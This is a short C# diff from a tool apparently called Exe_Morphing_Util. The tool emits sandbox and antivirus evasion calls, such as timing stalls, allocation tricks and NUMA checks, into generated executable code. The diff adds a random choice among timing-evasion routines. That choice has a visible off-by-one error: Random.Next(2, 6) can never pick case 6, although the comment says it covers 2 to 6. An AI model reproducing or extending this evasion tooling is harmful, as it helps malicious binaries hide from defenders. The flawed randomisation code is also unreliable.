@@ -716,17 +716,41 @@ namespace Exe_Morphing_Util
             if (cbLongStall.Checked)
             {
                 sw.WriteLine("LongStall();");
-                sw.WriteLine("timing_evasion_3();");
+                sw.WriteLine("timing_evasion_1();");
+            }
+            if (cbSpecialStall.Checked)
+            {
+                // pick 1 of 5 randomly, timing_evasion_2-6
+                Random ran = new Random();
+                int rando = ran.Next(2, 6);
+                switch (rando)
+                {
+                    case 2:
+                        sw.WriteLine("timing_evasion_2();");
+                        break;
+                    case 3:
+                        sw.WriteLine("timing_evasion_3();");
+                        break;
+                    case 4:
+                        sw.WriteLine("timing_evasion_4();");
+                        break;
+                    case 5:
+                        sw.WriteLine("timing_evasion_5();");
+                        break;
+                    case 6:
+                        sw.WriteLine("timing_evasion_6();");
+                        break;
+                }
+
+
             }
             if (cbMallocTrick.Checked)
             {
                 sw.WriteLine("AllocMem_Fornoreason();");
-
             }
             if (cbNuma.Checked)
             {
                 sw.WriteLine("NumaEvas();");
-
             }
             if (cbProcessMem.Checked)
             {
